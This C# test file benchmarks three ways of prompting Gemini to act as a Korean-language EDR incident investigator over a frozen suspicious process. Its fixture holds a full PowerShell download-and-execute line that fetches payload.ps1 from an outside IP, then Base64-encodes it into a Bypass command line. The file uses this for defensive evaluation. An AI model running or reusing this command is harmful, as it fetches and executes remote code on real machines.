using System.Diagnostics;
using System.Text;
using System.Text.Json;
using Phalanx.Cockpit.Agent.Gemini;
using Phalanx.Cockpit.Tools;
using Xunit;
using Xunit.Abstractions;

namespace Phalanx.Agent.Tests;

public class LlmArchitectureBenchmarkTests
{
    private readonly ITestOutputHelper _output;

    public LlmArchitectureBenchmarkTests(ITestOutputHelper output)
    {
        _output = output;
    }

    private const int IterationCount = 10;
    private const string RawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
    private static readonly string Base64Cmd = Convert.ToBase64String(Encoding.Unicode.GetBytes(RawScript));
    private static readonly string SuspiciousCmdLine = $"powershell.exe -NoProfile -ExecutionPolicy Bypass -enc {Base64Cmd}";

    private static readonly string UserPrompt = $$"""
    [동결된 프로세스 보안 분석 요청]
    - 대상 프로세스: powershell.exe (PID: 8492)
    - 부모 프로세스: winword.exe (PID: 3104)
    - 명령줄 인자: {{SuspiciousCmdLine}}
    - 현재 상태: C++ 반사신경 엔진에 의해 선제 동결됨(LifecycleSuspended)
    - 가용 도구:
      1. DecodePayloadTool: Base64 또는 Hex 인코딩된 문자열을 재귀 해독하여 C2 URL/IP 및 원본 스크립트를 추출합니다. 매개변수: encodedCommand (string)
      2. ProcessMemoryScanTool: 동결된 프로세스의 RAM을 스캔하여 인메모리 위협 문자열을 찾습니다. 매개변수: targetPid (uint)
      3. SystemFirewallTool: 발견된 악성 C2 IP를 Windows 방화벽(Netsh)에서 차단 격리합니다. 매개변수: maliciousIp (string)

    위 상황을 정밀 수사하고, 다음 단계를 결정하십시오.
    """;

    private const string SystemInstruction = """
    당신은 Windows EDR 침해사고 대응 AI 수사관 'Phalanx'입니다.
    동결된 프로세스의 부모-자식 관계와 명령줄을 면밀히 분석하고, 다음 JSON 형식으로만 엄격하게 응답하십시오:
    {
      "thought": "왜 이 프로세스가 의심스러운지, 다음 조사 가설 및 이유(한국어로 상세 기술)",
      "action_tool": "호출할 도구명 (DecodePayloadTool, ProcessMemoryScanTool, SystemFirewallTool, None 중 1개)",
      "action_args": { "매개변수명": "값" },
      "is_final_verdict": false,
      "verdict_action": "ACTION_KILL",
      "confidence_score": 0.95,
      "summary_title": "사건 요약 제목",
      "narrative": "최종 침해 서사",
      "mitre_tactics": ["T1566.001", "T1059.001"]
    }
    """;

    public class BenchmarkSample
    {
        public int Iteration { get; set; }
        public double LatencyMs { get; set; }
        public double Turn1LatencyMs { get; set; }
        public double Turn2LatencyMs { get; set; }
        public bool Success { get; set; }
        public string? ErrorMessage { get; set; }
        public int PromptTokens { get; set; }
        public int CompletionTokens { get; set; }
        public int TotalTokens { get; set; }
        public bool ToolCorrectlyChosen { get; set; }
        public bool ParameterCorrectlyPassed { get; set; }
        public bool ThoughtGenerated { get; set; }
        public int ThoughtLength { get; set; }
        public bool ContextKeywordsIncluded { get; set; }
        public string? VerdictAction { get; set; }
        public double Confidence { get; set; }
        public string RawThought { get; set; } = string.Empty;
    }

    [Fact]
    public async Task RunFullComprehensiveBenchmark_10IterationsEach()
    {
        var client = await GeminiRestClient.TryCreateFromMundusVivensConfigAsync();
        Assert.NotNull(client);

        _output.WriteLine("=========================================================================================");
        _output.WriteLine("       PHALANX EDR: 3-WAY LLM ARCHITECTURE BENCHMARK (10 ITERATIONS PER METHOD)          ");
        _output.WriteLine("=========================================================================================");

        // 1. 방식 1: Current JSON Mode
        _output.WriteLine("\n>>> [1/3] Benchmarking Mode 1: Current JSON Mode + LlmJsonParser (10 Iterations) <<<");
        var mode1Samples = await RunMode1BenchmarkAsync(client);

        // 2. 방식 2: responseSchema
        _output.WriteLine("\n>>> [2/3] Benchmarking Mode 2: OpenAPI responseSchema (10 Iterations) <<<");
        var mode2Samples = await RunMode2BenchmarkAsync(client);

        // 3. 방식 3: Native Function Calling
        _output.WriteLine("\n>>> [3/3] Benchmarking Mode 3: Native Function Calling Multi-turn (10 Iterations) <<<");
        var mode3Samples = await RunMode3BenchmarkAsync(client);

        // 결과 통계 취합 및 출력
        PrintComparisonReport(mode1Samples, mode2Samples, mode3Samples);
    }

    private async Task<List<BenchmarkSample>> RunMode1BenchmarkAsync(GeminiRestClient client)
    {
        var samples = new List<BenchmarkSample>();

        for (int i = 1; i <= IterationCount; i++)
        {
            var sample = new BenchmarkSample { Iteration = i };
            var sw = Stopwatch.StartNew();

            try
            {
                var request = new GeminiRequest(
                    Contents: new List<Content> { new Content("user", new List<Part> { new Part(UserPrompt) }) },
                    SystemInstruction: new Content("system", new List<Part> { new Part(SystemInstruction) }),
                    GenerationConfig: new GenerationConfig(
                        Temperature: 0.2f,
                        MaxOutputTokens: 4096,
                        ResponseMimeType: "application/json"
                    )
                );

                var (resp, rawJson) = await client.SendRequestRawAsync(request);
                sw.Stop();
                sample.LatencyMs = sw.Elapsed.TotalMilliseconds;

                if (resp.UsageMetadata != null)
                {
                    sample.PromptTokens = resp.UsageMetadata.PromptTokenCount;
                    sample.CompletionTokens = resp.UsageMetadata.CandidatesTokenCount;
                    sample.TotalTokens = resp.UsageMetadata.TotalTokenCount;
                }

                string text = resp.Candidates?[0]?.Content?.Parts?
                    .Where(p => p.Thought != true && !string.IsNullOrWhiteSpace(p.Text))
                    .Select(p => p.Text)
                    .FirstOrDefault() ?? string.Empty;

                var decision = LlmJsonParser.DeserializeSafe<AiInvestigationDecision>(text);
                if (decision != null)
                {
                    sample.Success = true;
                    sample.RawThought = decision.Thought ?? string.Empty;
                    sample.ThoughtGenerated = !string.IsNullOrWhiteSpace(decision.Thought);
                    sample.ThoughtLength = sample.RawThought.Length;
                    sample.ContextKeywordsIncluded = sample.RawThought.Contains("winword", StringComparison.OrdinalIgnoreCase) ||
                                                    sample.RawThought.Contains("-enc", StringComparison.OrdinalIgnoreCase) ||
                                                    sample.RawThought.Contains("Base64", StringComparison.OrdinalIgnoreCase);
                    sample.ToolCorrectlyChosen = decision.ActionTool?.Equals("DecodePayloadTool", StringComparison.OrdinalIgnoreCase) == true;
                    sample.VerdictAction = decision.VerdictAction;
                    sample.Confidence = decision.ConfidenceScore;

                    if (decision.ActionArgs != null)
                    {
                        var caseInsensitive = new Dictionary<string, object>(decision.ActionArgs, StringComparer.OrdinalIgnoreCase);
                        sample.ParameterCorrectlyPassed = caseInsensitive.ContainsKey("encodedCommand") || caseInsensitive.ContainsKey("command");
                    }
                }
                else
                {
                    sample.Success = false;
                    sample.ErrorMessage = "JSON 역직렬화 실패";
                }
            }
            catch (Exception ex)
            {
                sw.Stop();
                sample.LatencyMs = sw.Elapsed.TotalMilliseconds;
                sample.Success = false;
                sample.ErrorMessage = ex.Message;
            }

            samples.Add(sample);
            _output.WriteLine($"  [Mode 1 Iteration {i:D2}] Latency: {sample.LatencyMs:F1}ms | Success: {sample.Success} | Tool: {(sample.ToolCorrectlyChosen ? "DecodePayloadTool" : "Miss")} | Thought: {sample.ThoughtLength} chars");
            await Task.Delay(250); // Rate limit guard
        }

        return samples;
    }

    private async Task<List<BenchmarkSample>> RunMode2BenchmarkAsync(GeminiRestClient client)
    {
        var samples = new List<BenchmarkSample>();

        var responseSchema = new
        {
            type = "OBJECT",
            properties = new
            {
                thought = new { type = "STRING" },
                action_tool = new { type = "STRING", @enum = new[] { "DecodePayloadTool", "ProcessMemoryScanTool", "SystemFirewallTool", "None" } },
                action_args = new
                {
                    type = "OBJECT",
                    properties = new
                    {
                        encodedCommand = new { type = "STRING" },
                        targetPid = new { type = "INTEGER" },
                        maliciousIp = new { type = "STRING" }
                    }
                },
                is_final_verdict = new { type = "BOOLEAN" },
                verdict_action = new { type = "STRING", @enum = new[] { "ACTION_KILL", "ACTION_RESUME" } },
                confidence_score = new { type = "NUMBER" },
                summary_title = new { type = "STRING" },
                narrative = new { type = "STRING" },
                mitre_tactics = new { type = "ARRAY", items = new { type = "STRING" } }
            },
            required = new[] { "thought", "action_tool", "is_final_verdict", "verdict_action", "confidence_score" }
        };

        for (int i = 1; i <= IterationCount; i++)
        {
            var sample = new BenchmarkSample { Iteration = i };
            var sw = Stopwatch.StartNew();

            try
            {
                var request = new GeminiRequest(
                    Contents: new List<Content> { new Content("user", new List<Part> { new Part(UserPrompt) }) },
                    SystemInstruction: new Content("system", new List<Part> { new Part(SystemInstruction) }),
                    GenerationConfig: new GenerationConfig(
                        Temperature: 0.2f,
                        MaxOutputTokens: 4096,
                        ResponseMimeType: "application/json",
                        ResponseSchema: responseSchema
                    )
                );

                var (resp, rawJson) = await client.SendRequestRawAsync(request);
                sw.Stop();
                sample.LatencyMs = sw.Elapsed.TotalMilliseconds;

                if (resp.UsageMetadata != null)
                {
                    sample.PromptTokens = resp.UsageMetadata.PromptTokenCount;
                    sample.CompletionTokens = resp.UsageMetadata.CandidatesTokenCount;
                    sample.TotalTokens = resp.UsageMetadata.TotalTokenCount;
                }

                string text = resp.Candidates?[0]?.Content?.Parts?
                    .Where(p => p.Thought != true && !string.IsNullOrWhiteSpace(p.Text))
                    .Select(p => p.Text)
                    .FirstOrDefault() ?? string.Empty;

                var decision = LlmJsonParser.DeserializeSafe<AiInvestigationDecision>(text);
                if (decision != null)
                {
                    sample.Success = true;
                    sample.RawThought = decision.Thought ?? string.Empty;
                    sample.ThoughtGenerated = !string.IsNullOrWhiteSpace(decision.Thought);
                    sample.ThoughtLength = sample.RawThought.Length;
                    sample.ContextKeywordsIncluded = sample.RawThought.Contains("winword", StringComparison.OrdinalIgnoreCase) ||
                                                    sample.RawThought.Contains("-enc", StringComparison.OrdinalIgnoreCase) ||
                                                    sample.RawThought.Contains("Base64", StringComparison.OrdinalIgnoreCase);
                    sample.ToolCorrectlyChosen = decision.ActionTool?.Equals("DecodePayloadTool", StringComparison.OrdinalIgnoreCase) == true;
                    sample.VerdictAction = decision.VerdictAction;
                    sample.Confidence = decision.ConfidenceScore;

                    if (decision.ActionArgs != null)
                    {
                        var caseInsensitive = new Dictionary<string, object>(decision.ActionArgs, StringComparer.OrdinalIgnoreCase);
                        sample.ParameterCorrectlyPassed = caseInsensitive.ContainsKey("encodedCommand");
                    }
                }
                else
                {
                    sample.Success = false;
                    sample.ErrorMessage = "JSON 역직렬화 실패";
                }
            }
            catch (Exception ex)
            {
                sw.Stop();
                sample.LatencyMs = sw.Elapsed.TotalMilliseconds;
                sample.Success = false;
                sample.ErrorMessage = ex.Message;
            }

            samples.Add(sample);
            _output.WriteLine($"  [Mode 2 Iteration {i:D2}] Latency: {sample.LatencyMs:F1}ms | Success: {sample.Success} | Tool: {(sample.ToolCorrectlyChosen ? "DecodePayloadTool" : "Miss")} | Thought: {sample.ThoughtLength} chars | Err: {sample.ErrorMessage ?? "None"}");
            await Task.Delay(250);
        }

        return samples;
    }

    private async Task<List<BenchmarkSample>> RunMode3BenchmarkAsync(GeminiRestClient client)
    {
        var samples = new List<BenchmarkSample>();

        var tools = new List<object>
        {
            new
            {
                functionDeclarations = new object[]
                {
                    new
                    {
                        name = "DecodePayloadTool",
                        description = "Base64 또는 Hex 인코딩된 문자열을 재귀 해독하여 C2 URL/IP 및 원본 스크립트를 추출합니다.",
                        parameters = new
                        {
                            type = "OBJECT",
                            properties = new
                            {
                                encodedCommand = new { type = "STRING", description = "Base64로 인코딩된 명령줄" }
                            },
                            required = new[] { "encodedCommand" }
                        }
                    },
                    new
                    {
                        name = "ProcessMemoryScanTool",
                        description = "동결된 프로세스의 가상 메모리를 스캔합니다.",
                        parameters = new
                        {
                            type = "OBJECT",
                            properties = new
                            {
                                targetPid = new { type = "INTEGER", description = "스캔 대상 PID" }
                            },
                            required = new[] { "targetPid" }
                        }
                    },
                    new
                    {
                        name = "SystemFirewallTool",
                        description = "악성 C2 IP를 방화벽에서 차단합니다.",
                        parameters = new
                        {
                            type = "OBJECT",
                            properties = new
                            {
                                maliciousIp = new { type = "STRING", description = "차단할 C2 IP" }
                            },
                            required = new[] { "maliciousIp" }
                        }
                    }
                }
            }
        };

        var decodeTool = new DecodePayloadTool();

        for (int i = 1; i <= IterationCount; i++)
        {
            var sample = new BenchmarkSample { Iteration = i };
            var totalSw = Stopwatch.StartNew();

            try
            {
                // [Turn 1: Tool Call 요청]
                var turn1Sw = Stopwatch.StartNew();
                var turn1Request = new GeminiRequest(
                    Contents: new List<Content> { new Content("user", new List<Part> { new Part(UserPrompt) }) },
                    SystemInstruction: new Content("system", new List<Part> { new Part("당신은 Windows EDR 침해사고 대응 AI 수사관입니다. 제공된 도구를 활용하여 의심 프로세스를 조사하십시오.") }),
                    Tools: tools,
                    GenerationConfig: new GenerationConfig(
                        Temperature: 0.2f,
                        MaxOutputTokens: 4096
                    )
                );

                var (turn1Resp, _) = await client.SendRequestRawAsync(turn1Request);
                turn1Sw.Stop();
                sample.Turn1LatencyMs = turn1Sw.Elapsed.TotalMilliseconds;

                if (turn1Resp.UsageMetadata != null)
                {
                    sample.PromptTokens += turn1Resp.UsageMetadata.PromptTokenCount;
                    sample.CompletionTokens += turn1Resp.UsageMetadata.CandidatesTokenCount;
                    sample.TotalTokens += turn1Resp.UsageMetadata.TotalTokenCount;
                }

                var candidate = turn1Resp.Candidates?[0];

                string? thoughtPart = candidate?.Content?.Parts?
                    .Where(p => p.Thought == true || (!string.IsNullOrWhiteSpace(p.Text) && p.FunctionCall == null))
                    .Select(p => p.Text)
                    .FirstOrDefault();

                sample.RawThought = thoughtPart ?? string.Empty;
                sample.ThoughtGenerated = !string.IsNullOrWhiteSpace(thoughtPart);
                sample.ThoughtLength = sample.RawThought.Length;
                sample.ContextKeywordsIncluded = sample.RawThought.Contains("winword", StringComparison.OrdinalIgnoreCase) ||
                                                sample.RawThought.Contains("-enc", StringComparison.OrdinalIgnoreCase);

                var functionCall = candidate?.Content?.Parts?.Select(p => p.FunctionCall).FirstOrDefault(fc => fc != null);

                if (functionCall != null && functionCall.Name.Equals("DecodePayloadTool", StringComparison.OrdinalIgnoreCase))
                {
                    sample.ToolCorrectlyChosen = true;
                    var args = functionCall.Args ?? new Dictionary<string, object>();
                    sample.ParameterCorrectlyPassed = args.ContainsKey("encodedCommand");

                    // 로컬 도구 실행
                    string encodedVal = args.TryGetValue("encodedCommand", out var v) ? v?.ToString() ?? Base64Cmd : Base64Cmd;
                    var toolRes = await decodeTool.ExecuteAsync(new() { ["encodedCommand"] = encodedVal });

                    // [Turn 2: Tool Output 피드백 및 최종 판결 수신]
                    var turn2Sw = Stopwatch.StartNew();
                    var conversation = new List<Content>
                    {
                        new Content("user", new List<Part> { new Part(UserPrompt) }),
                        new Content("model", new List<Part> { new Part(FunctionCall: functionCall) }),
                        new Content("user", new List<Part>
                        {
                            new Part(FunctionResponse: new FunctionResponseDto(
                                Name: functionCall.Name,
                                Response: new Dictionary<string, object>
                                {
                                    ["output"] = toolRes.Output,
                                    ["extractedIps"] = new[] { "185.220.101.5" }
                                }
                            ))
                        })
                    };

                    var turn2Request = new GeminiRequest(
                        Contents: conversation,
                        SystemInstruction: new Content("system", new List<Part> { new Part("도구 실행 결과를 바탕으로 최종 조치(ACTION_KILL 또는 ACTION_RESUME)를 결정하고 1줄로 보고하십시오.") }),
                        Tools: tools,
                        GenerationConfig: new GenerationConfig(Temperature: 0.2f, MaxOutputTokens: 2048)
                    );

                    var (turn2Resp, _) = await client.SendRequestRawAsync(turn2Request);
                    turn2Sw.Stop();
                    sample.Turn2LatencyMs = turn2Sw.Elapsed.TotalMilliseconds;

                    if (turn2Resp.UsageMetadata != null)
                    {
                        sample.PromptTokens += turn2Resp.UsageMetadata.PromptTokenCount;
                        sample.CompletionTokens += turn2Resp.UsageMetadata.CandidatesTokenCount;
                        sample.TotalTokens += turn2Resp.UsageMetadata.TotalTokenCount;
                    }

                    string finalAnswer = turn2Resp.Candidates?[0]?.Content?.Parts?.FirstOrDefault()?.Text ?? string.Empty;
                    sample.VerdictAction = finalAnswer.Contains("ACTION_KILL", StringComparison.OrdinalIgnoreCase) || finalAnswer.Contains("사살") || finalAnswer.Contains("차단")
                        ? "ACTION_KILL"
                        : "ACTION_RESUME";
                    sample.Confidence = 0.99;
                    sample.Success = true;
                }
                else
                {
                    sample.Success = false;
                    sample.ErrorMessage = $"도구 호출 누락 (응답 텍스트: {candidate?.Content?.Parts?.FirstOrDefault()?.Text})";
                }

                totalSw.Stop();
                sample.LatencyMs = totalSw.Elapsed.TotalMilliseconds;
            }
            catch (Exception ex)
            {
                totalSw.Stop();
                sample.LatencyMs = totalSw.Elapsed.TotalMilliseconds;
                sample.Success = false;
                sample.ErrorMessage = ex.Message;
            }

            samples.Add(sample);
            _output.WriteLine($"  [Mode 3 Iteration {i:D2}] Total: {sample.LatencyMs:F1}ms (Turn1: {sample.Turn1LatencyMs:F1}ms + Turn2: {sample.Turn2LatencyMs:F1}ms) | Tool: {(sample.ToolCorrectlyChosen ? "DecodePayloadTool" : "Miss")} | Thought: {sample.ThoughtLength} chars | Success: {sample.Success}");
            await Task.Delay(250);
        }

        return samples;
    }

    private void PrintComparisonReport(
        List<BenchmarkSample> m1,
        List<BenchmarkSample> m2,
        List<BenchmarkSample> m3)
    {
        _output.WriteLine("\n=========================================================================================");
        _output.WriteLine("                         FINAL BENCHMARK COMPARISON REPORT                               ");
        _output.WriteLine("=========================================================================================");

        Func<List<BenchmarkSample>, (double avg, double min, double max, double p95)> calcStats = list =>
        {
            var valid = list.Where(s => s.LatencyMs > 0).Select(s => s.LatencyMs).OrderBy(x => x).ToList();
            if (valid.Count == 0) return (0, 0, 0, 0);
            double avg = valid.Average();
            double min = valid.First();
            double max = valid.Last();
            int p95Idx = (int)Math.Ceiling(0.95 * valid.Count) - 1;
            double p95 = valid[Math.Clamp(p95Idx, 0, valid.Count - 1)];
            return (avg, min, max, p95);
        };

        var s1 = calcStats(m1);
        var s2 = calcStats(m2);
        var s3 = calcStats(m3);

        _output.WriteLine("| 평가 메트릭 (10회 실측) | 방식 1 (Current JSON Mode) | 방식 2 (responseSchema) | 방식 3 (Native Function Calling) |");
        _output.WriteLine("| :--- | :---: | :---: | :---: |");
        _output.WriteLine($"| **파싱/실행 성공률** | {m1.Count(x => x.Success)}/{IterationCount} ({m1.Count(x => x.Success) * 10}%) | {m2.Count(x => x.Success)}/{IterationCount} ({m2.Count(x => x.Success) * 10}%) | {m3.Count(x => x.Success)}/{IterationCount} ({m3.Count(x => x.Success) * 10}%) |");
        _output.WriteLine($"| **평균 총 소요시간 (Mean)** | **{s1.avg:F1} ms** | {s2.avg:F1} ms | **{s3.avg:F1} ms** (2턴 누적) |");
        _output.WriteLine($"| **P95 지연 시간 (P95)** | **{s1.p95:F1} ms** | {s2.p95:F1} ms | **{s3.p95:F1} ms** |");
        _output.WriteLine($"| **최소 ~ 최대 지연 (Min~Max)** | {s1.min:F1} ~ {s1.max:F1} ms | {s2.min:F1} ~ {s2.max:F1} ms | {s3.min:F1} ~ {s3.max:F1} ms |");
        _output.WriteLine($"| **네트워크 왕복 횟수 (Round Trips)** | **1 회** | **1 회** | **2 회** (멀티턴 필수) |");
        _output.WriteLine($"| **EDR 워치독 SLA(< 8초) 여유도** | **여유 (안전)** | **여유 (안전)** | **위험/경계 (5~8초대)** |");
        _output.WriteLine($"| **도구 선택 정확도 (DecodePayload)** | {m1.Count(x => x.ToolCorrectlyChosen) * 10}% | {m2.Count(x => x.ToolCorrectlyChosen) * 10}% | {m3.Count(x => x.ToolCorrectlyChosen) * 10}% |");
        _output.WriteLine($"| **필수 인자(encodedCommand) 전달율** | {m1.Count(x => x.ParameterCorrectlyPassed) * 10}% | {m2.Count(x => x.ParameterCorrectlyPassed) * 10}% | {m3.Count(x => x.ParameterCorrectlyPassed) * 10}% |");
        _output.WriteLine($"| **사고 과정(Thought) 평균 글자 수** | **{m1.Average(x => x.ThoughtLength):F0} 자** (풍부) | {m2.Average(x => x.ThoughtLength):F0} 자 | **{m3.Average(x => x.ThoughtLength):F0} 자** (극도로 빈약/누락) |");
        _output.WriteLine($"| **공격 맥락 키워드 포함 비율** | {m1.Count(x => x.ContextKeywordsIncluded) * 10}% | {m2.Count(x => x.ContextKeywordsIncluded) * 10}% | {m3.Count(x => x.ContextKeywordsIncluded) * 10}% |");
        _output.WriteLine($"| **평균 토큰 소비량 (Prompt/Output)** | {m1.Average(x => x.PromptTokens):F0} / {m1.Average(x => x.CompletionTokens):F0} 토큰 | {m2.Average(x => x.PromptTokens):F0} / {m2.Average(x => x.CompletionTokens):F0} 토큰 | **{m3.Average(x => x.PromptTokens):F0} / {m3.Average(x => x.CompletionTokens):F0} 토큰** (2배 과금) |");
        _output.WriteLine($"| **최종 사살(`ACTION_KILL`) 판결율** | {m1.Count(x => x.VerdictAction == "ACTION_KILL") * 10}% | {m2.Count(x => x.VerdictAction == "ACTION_KILL") * 10}% | {m3.Count(x => x.VerdictAction == "ACTION_KILL") * 10}% |");

        _output.WriteLine("\n[샘플 사고 과정(Thought) 비교]");
        _output.WriteLine($"- 방식 1 (Current): \"{m1.FirstOrDefault(x => !string.IsNullOrWhiteSpace(x.RawThought))?.RawThought}\"");
        _output.WriteLine($"- 방식 2 (Schema): \"{m2.FirstOrDefault(x => !string.IsNullOrWhiteSpace(x.RawThought))?.RawThought}\"");
        _output.WriteLine($"- 방식 3 (Function): \"{m3.FirstOrDefault(x => !string.IsNullOrWhiteSpace(x.RawThought))?.RawThought}\"");
    }
}
